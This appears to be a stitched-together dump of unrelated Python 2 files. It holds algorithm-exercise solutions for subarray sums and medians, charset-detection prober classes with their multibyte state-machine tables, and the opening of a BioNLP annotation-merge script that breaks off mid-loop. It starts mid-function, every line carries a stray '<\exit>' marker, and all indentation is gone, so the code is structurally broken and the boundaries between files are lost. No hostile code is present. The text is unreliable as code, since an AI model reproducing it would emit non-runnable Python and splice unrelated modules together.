for i in xrange(n-1, -1, -1):<\exit>
current += nums[i]<\exit>
if i+1 <= n-1:<\exit>
max_right[i] = max(current, max_right[i+1], max_right[i])<\exit>
else:<\exit>
max_right[i] = max(current, max_right[i])<\exit>
if current < 0:<\exit>
current = 0<\exit>
current = 0<\exit>
for i in xrange(n-1, -1, -1):<\exit>
current += nums[i]<\exit>
if i+1 <= n-1:<\exit>
min_right[i] = min(current, min_right[i+1], min_right[i])<\exit>
else:<\exit>
min_right[i] = min(current, min_right[i])<\exit>
if current > 0:<\exit>
current = 0<\exit>
maxa = 0<\exit>
for i in xrange(n-1):<\exit>
maxa = max(maxa, abs(max_left[i]-min_right[i+1]), abs(min_left[i]-max_right[i+1]))<\exit>
return maxa<\exit>
if __name__ == "__main__":<\exit>
print Solution().maxDiffSubArrays([-4, 5, -4, 5, -4, 5, -4, 5, -4, 5, -4, 5, -4, 5, -4, 5, -4, 5, -1000])<\exit>
class Solution:<\exit>
def maxTwoSubArrays(self, nums):<\exit>
n = len(nums)<\exit>
f = [[-1<<31 for _ in xrange(n+1)] for _ in xrange(2)]<\exit>
cur = 0<\exit>
for i in xrange(1, n+1):<\exit>
cur += nums[i-1]<\exit>
f[0][i] = max(nums[i-1], f[0][i-1], cur)<\exit>
if cur < 0:<\exit>
cur = 0<\exit>
cur = 0<\exit>
for i in xrange(n-1, -1, -1):<\exit>
cur += nums[i]<\exit>
f[1][i] = max(nums[i], f[1][i+1], cur)<\exit>
if cur < 0:<\exit>
cur = 0<\exit>
maxa = -1<<31<\exit>
for i in xrange(1, n):<\exit>
maxa = max(maxa, f[0][i]+f[1][i])<\exit>
return maxa<\exit>
if __name__ == "__main__":<\exit>
print Solution().maxTwoSubArrays([1, 3, -1, 2, -1, 2])<\exit>
class Solution:<\exit>
def maxKSubArrays(self, nums, k):<\exit>
n = len(nums)<\exit>
f = [[0 for _ in xrange(k+1)] for _ in xrange(n+1)]<\exit>
g = [[0 for _ in xrange(k+1)] for _ in xrange(n+1)]<\exit>
s = [0 for _ in xrange(n+1)]<\exit>
for i in xrange(1, n+1):<\exit>
s[i] = s[i-1]+nums[i-1]<\exit>
for i in xrange(1, n+1):<\exit>
for st in xrange(1, k+1):<\exit>
if st == 1:<\exit>
f[i][st] = max([s[i]-s[j] for j in xrange(i)])<\exit>
else:<\exit>
f[i][st] = max([g[j][st-1]+s[i]-s[j] for j in xrange(i)])<\exit>
g[i][st] = max([f[j][st] for j in xrange(i+1)])<\exit>
maxa = -1<<31<\exit>
for i in xrange(1, n+1):<\exit>
maxa = max(maxa, g[i][k])<\exit>
return maxa<\exit>
if __name__ == "__main__":<\exit>
print Solution().maxKSubArrays([1, 2, 3], 1)<\exit>
print Solution().maxKSubArrays([-1, -2, -3, -100, -1, -50], 2)<\exit>
import sys<\exit>
from . import constants<\exit>
from .charsetprober import CharSetProber<\exit>
class MultiByteCharSetProber(CharSetProber):<\exit>
def __init__(self):<\exit>
CharSetProber.__init__(self)<\exit>
self._mDistributionAnalyzer = None<\exit>
self._mCodingSM = None<\exit>
self._mLastChar = [0, 0]<\exit>
def reset(self):<\exit>
CharSetProber.reset(self)<\exit>
if self._mCodingSM:<\exit>
self._mCodingSM.reset()<\exit>
if self._mDistributionAnalyzer:<\exit>
self._mDistributionAnalyzer.reset()<\exit>
self._mLastChar = [0, 0]<\exit>
def get_charset_name(self):<\exit>
pass<\exit>
def feed(self, aBuf):<\exit>
aLen = len(aBuf)<\exit>
for i in range(0, aLen):<\exit>
codingState = self._mCodingSM.next_state(aBuf[i])<\exit>
if codingState == constants.eError:<\exit>
if constants._debug:<\exit>
sys.stderr.write(self.get_charset_name()<\exit>
+ ' prober hit error at byte ' + str(i)<\exit>
+ '\n')<\exit>
self._mState = constants.eNotMe<\exit>
break<\exit>
elif codingState == constants.eItsMe:<\exit>
self._mState = constants.eFoundIt<\exit>
break<\exit>
elif codingState == constants.eStart:<\exit>
charLen = self._mCodingSM.get_current_charlen()<\exit>
if i == 0:<\exit>
self._mLastChar[1] = aBuf[0]<\exit>
self._mDistributionAnalyzer.feed(self._mLastChar, charLen)<\exit>
else:<\exit>
self._mDistributionAnalyzer.feed(aBuf[i - 1:i + 1],<\exit>
charLen)<\exit>
self._mLastChar[0] = aBuf[aLen - 1]<\exit>
if self.get_state() == constants.eDetecting:<\exit>
if (self._mDistributionAnalyzer.got_enough_data() and<\exit>
(self.get_confidence() > constants.SHORTCUT_THRESHOLD)):<\exit>
self._mState = constants.eFoundIt<\exit>
return self.get_state()<\exit>
def get_confidence(self):<\exit>
return self._mDistributionAnalyzer.get_confidence()<\exit>
from .charsetgroupprober import CharSetGroupProber<\exit>
from .utf8prober import UTF8Prober<\exit>
from .sjisprober import SJISProber<\exit>
from .eucjpprober import EUCJPProber<\exit>
from .gb2312prober import GB2312Prober<\exit>
from .euckrprober import EUCKRProber<\exit>
from .big5prober import Big5Prober<\exit>
from .euctwprober import EUCTWProber<\exit>
class MBCSGroupProber(CharSetGroupProber):<\exit>
def __init__(self):<\exit>
CharSetGroupProber.__init__(self)<\exit>
self._mProbers = [<\exit>
UTF8Prober(),<\exit>
SJISProber(),<\exit>
EUCJPProber(),<\exit>
GB2312Prober(),<\exit>
EUCKRProber(),<\exit>
Big5Prober(),<\exit>
EUCTWProber()<\exit>
]<\exit>
self.reset()<\exit>
from .constants import eStart, eError, eItsMe<\exit>
BIG5_cls = (<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,0,0,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,0,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,1,<\exit>
4,4,4,4,4,4,4,4,<\exit>
4,4,4,4,4,4,4,4,<\exit>
4,4,4,4,4,4,4,4,<\exit>
4,4,4,4,4,4,4,4,<\exit>
4,3,3,3,3,3,3,3,<\exit>
3,3,3,3,3,3,3,3,<\exit>
3,3,3,3,3,3,3,3,<\exit>
3,3,3,3,3,3,3,3,<\exit>
3,3,3,3,3,3,3,3,<\exit>
3,3,3,3,3,3,3,3,<\exit>
3,3,3,3,3,3,3,3,<\exit>
3,3,3,3,3,3,3,3,<\exit>
3,3,3,3,3,3,3,3,<\exit>
3,3,3,3,3,3,3,3,<\exit>
3,3,3,3,3,3,3,3,<\exit>
3,3,3,3,3,3,3,0<\exit>
)<\exit>
BIG5_st = (<\exit>
eError,eStart,eStart,     3,eError,eError,eError,eError,<\exit>
eError,eError,eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,eError,<\exit>
eError,eStart,eStart,eStart,eStart,eStart,eStart,eStart<\exit>
)<\exit>
Big5CharLenTable = (0, 1, 1, 2, 0)<\exit>
Big5SMModel = {'classTable': BIG5_cls,<\exit>
'classFactor': 5,<\exit>
'stateTable': BIG5_st,<\exit>
'charLenTable': Big5CharLenTable,<\exit>
'name': 'Big5'}<\exit>
EUCJP_cls = (<\exit>
4,4,4,4,4,4,4,4,<\exit>
4,4,4,4,4,4,5,5,<\exit>
4,4,4,4,4,4,4,4,<\exit>
4,4,4,5,4,4,4,4,<\exit>
4,4,4,4,4,4,4,4,<\exit>
4,4,4,4,4,4,4,4,<\exit>
4,4,4,4,4,4,4,4,<\exit>
4,4,4,4,4,4,4,4,<\exit>
4,4,4,4,4,4,4,4,<\exit>
4,4,4,4,4,4,4,4,<\exit>
4,4,4,4,4,4,4,4,<\exit>
4,4,4,4,4,4,4,4,<\exit>
4,4,4,4,4,4,4,4,<\exit>
4,4,4,4,4,4,4,4,<\exit>
4,4,4,4,4,4,4,4,<\exit>
4,4,4,4,4,4,4,4,<\exit>
5,5,5,5,5,5,5,5,<\exit>
5,5,5,5,5,5,1,3,<\exit>
5,5,5,5,5,5,5,5,<\exit>
5,5,5,5,5,5,5,5,<\exit>
5,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,5<\exit>
)<\exit>
EUCJP_st = (<\exit>
3,     4,     3,     5,eStart,eError,eError,eError,<\exit>
eError,eError,eError,eError,eItsMe,eItsMe,eItsMe,eItsMe,<\exit>
eItsMe,eItsMe,eStart,eError,eStart,eError,eError,eError,<\exit>
eError,eError,eStart,eError,eError,eError,     3,eError,<\exit>
3,eError,eError,eError,eStart,eStart,eStart,eStart<\exit>
)<\exit>
EUCJPCharLenTable = (2, 2, 2, 3, 1, 0)<\exit>
EUCJPSMModel = {'classTable': EUCJP_cls,<\exit>
'classFactor': 6,<\exit>
'stateTable': EUCJP_st,<\exit>
'charLenTable': EUCJPCharLenTable,<\exit>
'name': 'EUC-JP'}<\exit>
EUCKR_cls  = (<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,0,0,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,0,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,3,3,3,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,3,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,0<\exit>
)<\exit>
EUCKR_st = (<\exit>
eError,eStart,     3,eError,eError,eError,eError,eError,<\exit>
eItsMe,eItsMe,eItsMe,eItsMe,eError,eError,eStart,eStart<\exit>
)<\exit>
EUCKRCharLenTable = (0, 1, 2, 0)<\exit>
EUCKRSMModel = {'classTable': EUCKR_cls,<\exit>
'classFactor': 4,<\exit>
'stateTable': EUCKR_st,<\exit>
'charLenTable': EUCKRCharLenTable,<\exit>
'name': 'EUC-KR'}<\exit>
EUCTW_cls = (<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,0,0,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,0,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,6,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,3,4,4,4,4,4,4,<\exit>
5,5,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,3,1,3,3,3,3,<\exit>
3,3,3,3,3,3,3,3,<\exit>
3,3,3,3,3,3,3,3,<\exit>
3,3,3,3,3,3,3,3,<\exit>
3,3,3,3,3,3,3,3,<\exit>
3,3,3,3,3,3,3,3,<\exit>
3,3,3,3,3,3,3,3,<\exit>
3,3,3,3,3,3,3,0<\exit>
)<\exit>
EUCTW_st = (<\exit>
eError,eError,eStart,     3,     3,     3,     4,eError,<\exit>
eError,eError,eError,eError,eError,eError,eItsMe,eItsMe,<\exit>
eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,eError,eStart,eError,<\exit>
eStart,eStart,eStart,eError,eError,eError,eError,eError,<\exit>
5,eError,eError,eError,eStart,eError,eStart,eStart,<\exit>
eStart,eError,eStart,eStart,eStart,eStart,eStart,eStart<\exit>
)<\exit>
EUCTWCharLenTable = (0, 0, 1, 2, 2, 2, 3)<\exit>
EUCTWSMModel = {'classTable': EUCTW_cls,<\exit>
'classFactor': 7,<\exit>
'stateTable': EUCTW_st,<\exit>
'charLenTable': EUCTWCharLenTable,<\exit>
'name': 'x-euc-tw'}<\exit>
GB2312_cls = (<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,0,0,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,0,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
3,3,3,3,3,3,3,3,<\exit>
3,3,1,1,1,1,1,1,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,4,<\exit>
5,6,6,6,6,6,6,6,<\exit>
6,6,6,6,6,6,6,6,<\exit>
6,6,6,6,6,6,6,6,<\exit>
6,6,6,6,6,6,6,6,<\exit>
6,6,6,6,6,6,6,6,<\exit>
6,6,6,6,6,6,6,6,<\exit>
6,6,6,6,6,6,6,6,<\exit>
6,6,6,6,6,6,6,6,<\exit>
6,6,6,6,6,6,6,6,<\exit>
6,6,6,6,6,6,6,6,<\exit>
6,6,6,6,6,6,6,6,<\exit>
6,6,6,6,6,6,6,6,<\exit>
6,6,6,6,6,6,6,6,<\exit>
6,6,6,6,6,6,6,6,<\exit>
6,6,6,6,6,6,6,6,<\exit>
6,6,6,6,6,6,6,0<\exit>
)<\exit>
GB2312_st = (<\exit>
eError,eStart,eStart,eStart,eStart,eStart,     3,eError,<\exit>
eError,eError,eError,eError,eError,eError,eItsMe,eItsMe,<\exit>
eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,eError,eError,eStart,<\exit>
4,eError,eStart,eStart,eError,eError,eError,eError,<\exit>
eError,eError,     5,eError,eError,eError,eItsMe,eError,<\exit>
eError,eError,eStart,eStart,eStart,eStart,eStart,eStart<\exit>
)<\exit>
GB2312CharLenTable = (0, 1, 1, 1, 1, 1, 2)<\exit>
GB2312SMModel = {'classTable': GB2312_cls,<\exit>
'classFactor': 7,<\exit>
'stateTable': GB2312_st,<\exit>
'charLenTable': GB2312CharLenTable,<\exit>
'name': 'GB2312'}<\exit>
SJIS_cls = (<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,0,0,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,0,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,1,<\exit>
3,3,3,3,3,3,3,3,<\exit>
3,3,3,3,3,3,3,3,<\exit>
3,3,3,3,3,3,3,3,<\exit>
3,3,3,3,3,3,3,3,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
3,3,3,3,3,3,3,3,<\exit>
3,3,3,3,3,4,4,4,<\exit>
4,4,4,4,4,4,4,4,<\exit>
4,4,4,4,4,0,0,0<\exit>
)<\exit>
SJIS_st = (<\exit>
eError,eStart,eStart,     3,eError,eError,eError,eError,<\exit>
eError,eError,eError,eError,eItsMe,eItsMe,eItsMe,eItsMe,<\exit>
eItsMe,eItsMe,eError,eError,eStart,eStart,eStart,eStart<\exit>
)<\exit>
SJISCharLenTable = (0, 1, 1, 2, 0, 0)<\exit>
SJISSMModel = {'classTable': SJIS_cls,<\exit>
'classFactor': 6,<\exit>
'stateTable': SJIS_st,<\exit>
'charLenTable': SJISCharLenTable,<\exit>
'name': 'Shift_JIS'}<\exit>
UCS2BE_cls = (<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,1,0,0,2,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,3,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,3,3,3,3,3,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,4,5<\exit>
)<\exit>
UCS2BE_st  = (<\exit>
5,     7,     7,eError,     4,     3,eError,eError,<\exit>
eError,eError,eError,eError,eItsMe,eItsMe,eItsMe,eItsMe,<\exit>
eItsMe,eItsMe,     6,     6,     6,     6,eError,eError,<\exit>
6,     6,     6,     6,     6,eItsMe,     6,     6,<\exit>
6,     6,     6,     6,     5,     7,     7,eError,<\exit>
5,     8,     6,     6,eError,     6,     6,     6,<\exit>
6,     6,     6,     6,eError,eError,eStart,eStart<\exit>
)<\exit>
UCS2BECharLenTable = (2, 2, 2, 0, 2, 2)<\exit>
UCS2BESMModel = {'classTable': UCS2BE_cls,<\exit>
'classFactor': 6,<\exit>
'stateTable': UCS2BE_st,<\exit>
'charLenTable': UCS2BECharLenTable,<\exit>
'name': 'UTF-16BE'}<\exit>
UCS2LE_cls = (<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,1,0,0,2,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,3,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,3,3,3,3,3,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,4,5<\exit>
)<\exit>
UCS2LE_st = (<\exit>
6,     6,     7,     6,     4,     3,eError,eError,<\exit>
eError,eError,eError,eError,eItsMe,eItsMe,eItsMe,eItsMe,<\exit>
eItsMe,eItsMe,     5,     5,     5,eError,eItsMe,eError,<\exit>
5,     5,     5,eError,     5,eError,     6,     6,<\exit>
7,     6,     8,     8,     5,     5,     5,eError,<\exit>
5,     5,     5,eError,eError,eError,     5,     5,<\exit>
5,     5,     5,eError,     5,eError,eStart,eStart<\exit>
)<\exit>
UCS2LECharLenTable = (2, 2, 2, 2, 2, 2)<\exit>
UCS2LESMModel = {'classTable': UCS2LE_cls,<\exit>
'classFactor': 6,<\exit>
'stateTable': UCS2LE_st,<\exit>
'charLenTable': UCS2LECharLenTable,<\exit>
'name': 'UTF-16LE'}<\exit>
UTF8_cls = (<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,0,0,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,0,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
2,2,2,2,3,3,3,3,<\exit>
4,4,4,4,4,4,4,4,<\exit>
4,4,4,4,4,4,4,4,<\exit>
4,4,4,4,4,4,4,4,<\exit>
5,5,5,5,5,5,5,5,<\exit>
5,5,5,5,5,5,5,5,<\exit>
5,5,5,5,5,5,5,5,<\exit>
5,5,5,5,5,5,5,5,<\exit>
0,0,6,6,6,6,6,6,<\exit>
6,6,6,6,6,6,6,6,<\exit>
6,6,6,6,6,6,6,6,<\exit>
6,6,6,6,6,6,6,6,<\exit>
7,8,8,8,8,8,8,8,<\exit>
8,8,8,8,8,9,8,8,<\exit>
10,11,11,11,11,11,11,11,<\exit>
12,13,13,13,14,15,0,0<\exit>
)<\exit>
UTF8_st = (<\exit>
eError,eStart,eError,eError,eError,eError,     12,   10,<\exit>
9,     11,     8,     7,     6,     5,     4,    3,<\exit>
eError,eError,eError,eError,eError,eError,eError,eError,<\exit>
eError,eError,eError,eError,eError,eError,eError,eError,<\exit>
eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,<\exit>
eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,<\exit>
eError,eError,     5,     5,     5,     5,eError,eError,<\exit>
eError,eError,eError,eError,eError,eError,eError,eError,<\exit>
eError,eError,eError,     5,     5,     5,eError,eError,<\exit>
eError,eError,eError,eError,eError,eError,eError,eError,<\exit>
eError,eError,     7,     7,     7,     7,eError,eError,<\exit>
eError,eError,eError,eError,eError,eError,eError,eError,<\exit>
eError,eError,eError,eError,     7,     7,eError,eError,<\exit>
eError,eError,eError,eError,eError,eError,eError,eError,<\exit>
eError,eError,     9,     9,     9,     9,eError,eError,<\exit>
eError,eError,eError,eError,eError,eError,eError,eError,<\exit>
eError,eError,eError,eError,eError,     9,eError,eError,<\exit>
eError,eError,eError,eError,eError,eError,eError,eError,<\exit>
eError,eError,    12,    12,    12,    12,eError,eError,<\exit>
eError,eError,eError,eError,eError,eError,eError,eError,<\exit>
eError,eError,eError,eError,eError,    12,eError,eError,<\exit>
eError,eError,eError,eError,eError,eError,eError,eError,<\exit>
eError,eError,    12,    12,    12,eError,eError,eError,<\exit>
eError,eError,eError,eError,eError,eError,eError,eError,<\exit>
eError,eError,eStart,eStart,eStart,eStart,eError,eError,<\exit>
eError,eError,eError,eError,eError,eError,eError,eError<\exit>
)<\exit>
UTF8CharLenTable = (0, 1, 0, 0, 0, 0, 2, 3, 3, 3, 4, 4, 5, 5, 6, 6)<\exit>
UTF8SMModel = {'classTable': UTF8_cls,<\exit>
'classFactor': 16,<\exit>
'stateTable': UTF8_st,<\exit>
'charLenTable': UTF8CharLenTable,<\exit>
'name': 'UTF-8'}<\exit>
import heapq<\exit>
class DualHeap(object):<\exit>
def __init__(self):<\exit>
self.min_h = []<\exit>
self.max_h = []<\exit>
def insert(self, num):<\exit>
if not self.min_h or num > self.min_h[0]:<\exit>
heapq.heappush(self.min_h, num)<\exit>
else:<\exit>
heapq.heappush(self.max_h, -num)<\exit>
self.balance()<\exit>
def balance(self):<\exit>
l1 = len(self.min_h)<\exit>
l2 = len(self.max_h)<\exit>
if l1-l2 > 1:<\exit>
heapq.heappush(self.max_h, -heapq.heappop(self.min_h))<\exit>
self.balance()<\exit>
elif l2-l1 > 1:<\exit>
heapq.heappush(self.min_h, -heapq.heappop(self.max_h))<\exit>
self.balance()<\exit>
return<\exit>
def get_median(self):<\exit>
l1 = len(self.min_h)<\exit>
l2 = len(self.max_h)<\exit>
m = (l1+l2-1)/2<\exit>
if m == l2-1:<\exit>
return -self.max_h[0]<\exit>
elif m == l2:<\exit>
return self.min_h[0]<\exit>
raise Exception("not balanced")<\exit>
class Solution:<\exit>
def medianII(self, nums):<\exit>
dh = DualHeap()<\exit>
ret = []<\exit>
for num in nums:<\exit>
dh.insert(num)<\exit>
ret.append(dh.get_median())<\exit>
return ret<\exit>
if __name__=="__main__":<\exit>
assert Solution().medianII([4, 5, 1, 3, 2, 6, 0]) == [4, 4, 4, 3, 3, 3, 3]<\exit>
class Solution:<\exit>
def median(self, nums):<\exit>
n = len(nums)<\exit>
return self.find_kth(nums, 0, n, (n-1)/2)<\exit>
def find_kth(self, A, i, j, k):<\exit>
p = self.pivot(A, i, j)<\exit>
if k == p:<\exit>
return A[p]<\exit>
elif k > p:<\exit>
return self.find_kth(A, p+1, j, k)<\exit>
else:<\exit>
return self.find_kth(A, i, p, k)<\exit>
def pivot(self, A, i, j):<\exit>
p = i<\exit>
closed = p<\exit>
for ptr in xrange(i, j):<\exit>
if A[ptr] < A[p]:<\exit>
closed += 1<\exit>
A[ptr], A[closed] = A[closed], A[ptr]<\exit>
A[closed], A[p] = A[p], A[closed]<\exit>
return closed<\exit>
if __name__ == "__main__":<\exit>
assert Solution().median([4, 5, 1, 2, 3]) == 3<\exit>
assert Solution().median([7, 9, 4, 5]) == 5<\exit>
from __future__ import with_statement<\exit>
from collections import defaultdict<\exit>
from os.path import join as join_path<\exit>
from os.path import split as split_path<\exit>
from shlex import split as shlex_split<\exit>
from sys import stderr, stdin<\exit>
from subprocess import Popen, PIPE<\exit>
try:<\exit>
from argparse import ArgumentParser<\exit>
except ImportError:<\exit>
from os.path import basename<\exit>
from sys import path as sys_path<\exit>
sys_path.append(join_path(basename(__file__), '../server/lib'))<\exit>
from argparse import ArgumentParser<\exit>
UNMERGED_SUFFIXES=['a1', 'a2', 'co', 'rel']<\exit>
MERGED_SUFFIX='ann'<\exit>
ARGPARSER = ArgumentParser(description=("Merge BioNLP'11 ST annotations "<\exit>
'into a single file, reads paths from stdin'))<\exit>
ARGPARSER.add_argument('-w', '--no-warn', action='store_true',<\exit>
help='suppress warnings')<\exit>
def keynat(string):<\exit>
it = type(1)<\exit>
r = []<\exit>
for c in string:<\exit>
if c.isdigit():<\exit>
d = int(c)<\exit>
if r and type( r[-1] ) == it:<\exit>
r[-1] = r[-1] * 10 + d<\exit>
else:<\exit>
r.append(d)<\exit>
else:<\exit>
r.append(c.lower())<\exit>
return r<\exit>
def main(args):<\exit>
argp = ARGPARSER.parse_args(args[1:])<\exit>
id_to_ann_files = defaultdict(list)<\exit>
for file_path in (l.strip() for l in stdin):<\exit>
if not any((file_path.endswith(suff) for suff in UNMERGED_SUFFIXES)):<\exit>
if not argp.no_warn:<\exit>
import sys<\exit>
print >> sys.stderr, (<\exit>
'WARNING: invalid file suffix for %s, ignoring'<\exit>
) % (file_path, )<\exit>
continue<\exit>
dirname, basename = split_path(file_path)<\exit>
id = join_path(dirname, basename.split('.')[0])<\exit>
id_to_ann_files[id].append(file_path)<\exit>
for id, ann_files in id_to_ann_files.iteritems():<\exit>
lines = []<\exit>
for ann_file_path in ann_files:<\exit>
with open(ann_file_path, 'r') as ann_file:<\exit>
